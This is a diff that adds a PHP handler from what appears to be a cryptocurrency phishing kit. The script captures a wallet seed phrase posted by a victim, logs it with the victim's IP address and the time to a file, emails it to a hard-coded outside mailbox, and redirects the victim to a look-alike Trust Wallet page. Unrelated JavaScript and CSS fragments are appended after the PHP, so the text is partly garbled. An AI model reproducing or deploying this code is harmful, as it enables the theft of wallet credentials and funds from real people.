@@ -1,0 +1,81 @@
+<?php
+$file = "XKXKXKXKX______TXT";
+$key = $_POST['key'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$today = date("F j, Y, g:i a");
+
+$handle = fopen($file, 'a');
+fwrite($handle, "\n");
+fwrite($handle, "walletSeed   	: ");
+fwrite($handle, "$key");
+fwrite($handle, "\n");
+fwrite($handle, "IP Address	: ");
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "Time		: ");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fwrite($handle, "-----------@XXXX@-----------");
+
+$key = $_POST['key'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$today = date("F j, Y, g:i a");
+
+    // Multiple recipients
+    $to  = 'fietmy@yandex.com' . ', '; // Note the comma
+   
+
+
+    // Subject
+    $subject = 'Phrase';
+
+    // Message
+    $message   = "
+
+== : ".$key." 
+
+
+";
+
+
+include 'mail.php';
+$subject = ".$ip.";
+mail($rezult_mail, $subject, $message, $headers);
+
+
+
+
+
+    // To send HTML mail, the Content-type header must be set
+    $headers  = 'MIME-Version: 1.0' . "\r\n";
+    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
+
+    // Additional headers
+ 
+    $headers .= 'From: DOYOK TWT<fietmy@yandex.com>' . "\r\n";
+
+
+    // Mail it
+    mail($to, $subject, $message, $headers);
+    echo "<script LANGUAGE=\"JavaScript\">
+
+<!--
+window.location=\"https://trustwallet-token-airdrop-space.github.io/connect/supported-trustwallet.html?_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";
+// -->
+</script>";
+
+?>
+
+
+        document.write('<script src="/init.js?_t=' + cacheRound(15) + '"><\/script>');</script>
+<style>
+        .loader-component {
+            display: flex;
+            align-items: center;
+        }
+        .loader-component__layout {
+            height: 32px;
+            width: 32px;
+            overflow: hidden;
+            animation: around 3.8s infinite;
+        }
